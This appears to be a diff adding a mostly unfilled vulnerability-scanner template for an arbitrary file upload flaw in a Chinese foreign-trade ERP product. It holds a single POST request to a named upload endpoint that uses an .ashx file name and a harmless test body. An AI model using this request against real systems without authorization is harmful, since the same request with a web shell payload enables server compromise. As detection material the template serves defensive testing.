@@ -1,0 +1,19 @@
+id:
+info:
+  name: 富通天下外贸ERP任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /JoinfApp/EMail/UploadEmailAttr?name=.ashx
+  headers:
+  data: |
+    12345
+response1:
+  headers:
+  body: 12345
+  code: 200
+requests2:
+response2:
